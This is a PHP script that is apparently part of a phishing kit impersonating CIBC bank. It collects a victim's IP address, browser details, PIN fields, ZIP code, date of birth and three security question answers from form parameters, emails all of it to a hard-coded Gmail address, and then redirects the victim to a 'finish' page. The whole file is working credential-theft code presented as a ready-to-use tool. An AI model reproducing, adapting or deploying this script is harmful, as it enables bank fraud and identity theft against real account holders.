<?php
$ip = $_SERVER["REMOTE_ADDR"];
$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];

#browser info
$browser = $user_browser." - ".$user_os." - ".substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0,5);

#Country info
$_SESSION['cntcode'] = $countrycode;
$_SESSION['cntname'] = $countryname;




#Security information

$_SESSION['pin1'] = $_GET['pin1'];
$_SESSION['pin2'] = $_GET['pin2'];
$_SESSION['zip'] = $_GET['zip'];
$_SESSION['dob_month'] = $_GET['dob_month'];
$_SESSION['dob_day'] = $_GET['dob_day'];
$_SESSION['dob_year'] = $_GET['dob_year'];

$message = "
<div style=\"background-image: url('https://newevolutiondesigns.com/images/freebies/black-white-iphone-background-3.jpg');font-family: Tahoma;line-height: 25px;color: #333;font-size: 22px;border: 1px solid #06F;	padding: 20px;	border-radius: 5px; margin-top: 20px;\">
IP              =>   <font color='#F31414'>".$_SESSION['_IP_']."</font>
<br />
TIME            =>   <font color='#F31414'>".date('l jS \of F Y h:i:s A')."</font><br />
BROWSER         =>   <font color='#F31414'>".$browser."</font><br />

<hr style='border: 0;border-bottom: 1px solid #06F;background: #999;'/>
Challenge Question 1:  =>   <font color='#F31414'>".$_GET['1']."</font><br />
Answer 1 :  =>   <font color='#F31414'>".$_GET['01']."</font><br />
<hr style='border: 0;border-bottom: 1px solid #06F;background: #999;'/>

Challenge Question 2:  =>   <font color='#F31414'>".$_GET['2']."</font><br />
Answer 2 :  =>   <font color='#F31414'>".$_GET['02']."</font><br />
<hr style='border: 0;border-bottom: 1px solid #06F;background: #999;'/>

Challenge Question 3:  =>   <font color='#F31414'>".$_GET['3']."</font><br />
Answer 3 :  =>   <font color='#F31414'>".$_GET['03']."</font><br />
<hr style='border: 0;border-bottom: 1px solid #06F;background: #999;'/>

___________________________________________________________________
<br />
||~~ BY ~~ MR.Int(TN) ~~||
<br />

</div>";

$subject  = " CIBC :  Security Qestions / BILLING-  [ " . $_SESSION['_IP_'] . " - " . $_SESSION['cntname'] . " ] ";
$headers  = "MIME-Version: 1.0" . "\r\n";;
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From: MR-Int" . "\r\n";
$to = "goodvbesk1@gmail.com";
@mail($to,$subject,$message,$headers);

 
 header("location:../finish.php?websrc=".md5('XRAY')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
        
		  
		  
		  ?>